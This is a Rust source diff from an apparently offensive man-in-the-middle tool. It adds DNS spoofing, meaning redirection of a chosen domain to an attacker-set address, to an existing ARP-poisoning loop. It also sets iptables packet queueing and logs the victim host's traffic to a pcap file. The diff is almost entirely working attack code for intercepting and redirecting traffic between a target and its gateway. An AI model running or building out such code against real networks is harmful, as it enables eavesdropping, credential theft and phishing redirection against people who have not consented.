@@ -6,28 +6,32 @@ use std::thread;
 use std::time::{Duration, Instant};
 use pcap::Device;
 
-use crate::{dns, http};
+use crate::{dns, http, dnsspoof};
 use crate::headers::{ArpHeader, ArpType, IpHeader, Ethernet};
 use crate::util::{mac_to_string, pcap_open, self};
 
-pub struct ArpSpoof
+pub struct RozSpoof
 {
     device: Device,
     verbose: bool,
+    domain: String,
+    redirect_to: String,
 }
 
-impl ArpSpoof
+impl RozSpoof
 {
-    pub fn new(interface_name: String, verbose: bool) -> ArpSpoof
+    pub fn new(interface_name: String, verbose: bool, domain: String, redirect_to: String) -> RozSpoof
     {
         //Create a device
         let all_devices = Device::list().expect("Unable to get device list");
         let d = all_devices.iter().find(|d| d.name == interface_name).expect("Unable to find device");
 
-        ArpSpoof
+        RozSpoof
         {
             device: d.clone(),
             verbose,
+            domain,
+            redirect_to,
         }
     }
 
@@ -71,7 +75,26 @@ impl ArpSpoof
         None
     }
 
-    pub fn arp_poisoning(&self,
+    fn log_traffic(&self, target_ip: &Ipv4Addr, running: &Arc<AtomicBool>)
+    {
+        const CAP_FILE_NAME: &str = "rozmitmat.pcap";
+
+        let log_cap_filter = format!("host {}", target_ip);
+        let log_file = PathBuf::from(CAP_FILE_NAME);
+
+        println!("[*] Saving captured packets as {} ...", log_file.display());
+        
+        let mut log_cap = pcap_open(self.device.clone(), &log_cap_filter).unwrap();
+        
+        let r = running.clone();
+        let v = self.verbose;
+
+        thread::spawn(move || {
+            log_traffic_pcap(&mut log_cap, &log_file, &r, v).expect("Unable to write packets to file")
+        });
+    }
+
+    pub fn run(&self,
         own_mac_addr: [u8; 6],
         own_ip_addr: Ipv4Addr,
         target_ip: Ipv4Addr,
@@ -82,6 +105,7 @@ impl ArpSpoof
         running: &Arc<AtomicBool>) 
     {
         println!("[*] Resolving hosts (this can take a bit) ...");
+        
         let capture = pcap_open(self.device.clone(), "arp").unwrap();
         let capture = Arc::new(Mutex::new(capture));
         
@@ -125,25 +149,58 @@ impl ArpSpoof
         // Enable traffic logging
         if log_traffic 
         {
-            const CAP_FILE_NAME: &str = "rozmitmat.pcap";
+            self.log_traffic(&target_ip, &running);
+        }
+    
+        println!("[*] Setting iptables for queueing ...");
 
-            let log_cap_filter = format!("host {}", target_ip);
-            let log_file = PathBuf::from(CAP_FILE_NAME);
-
-            println!("[*] Saving captured packets as {} ...", log_file.display());
-            
-            let mut log_cap = pcap_open(self.device.clone(), &log_cap_filter).unwrap();
-            
-            let r = running.clone();
-            let v = self.verbose;
-
-            thread::spawn(move || {
-                log_traffic_pcap(&mut log_cap, &log_file, &r, v).expect("Unable to write packets to file")
-            });
+        match util::set_iptables_for_queueing()
+        {
+            Ok(_) => {},
+            Err(e) => 
+            {
+                println!("[!] Unable to set iptables: {}", e);
+                return;
+            }
         }
 
+        let r2 = running.clone();
+        let dom = self.domain.clone();
+        let red_to = self.redirect_to.clone();
+
+        thread::spawn(move ||{
+            let res: bool = match dnsspoof::run(red_to, dom, &r2)
+            {
+                Ok(_) => true,
+                Err(e) => 
+                {
+                    println!("[-] Unable to run dnsspoof: {}", e);
+                    r2.store(false, Ordering::SeqCst);
+                    false
+                }
+            };
+
+            println!("[*] Resetting iptables ... ");
+
+            match util::reset_iptables()
+            {
+                Ok(_) => {},
+                Err(e) => 
+                {
+                    println!("[!] Unable to reset iptables: {}", e);
+                    return;
+                }
+            }
+
+            if res == false
+            {
+                return;
+            }
+        });
+
+        let mut cap = capture.lock().unwrap();
+
         println!("[+] Poisoning traffic between {} <==> {}",target_ip, gateway_ip);
-        println!("[*] Press Ctrl-C to stop");
 
         // packets used for poisoning
         let packets: Vec<ArpHeader> = vec![
@@ -163,8 +220,8 @@ impl ArpSpoof
             ),
         ];
 
-        let mut cap = capture.lock().unwrap();
-        
+        println!("[*] Press Ctrl-C to stop");
+
         loop 
         {
             for p in &packets 
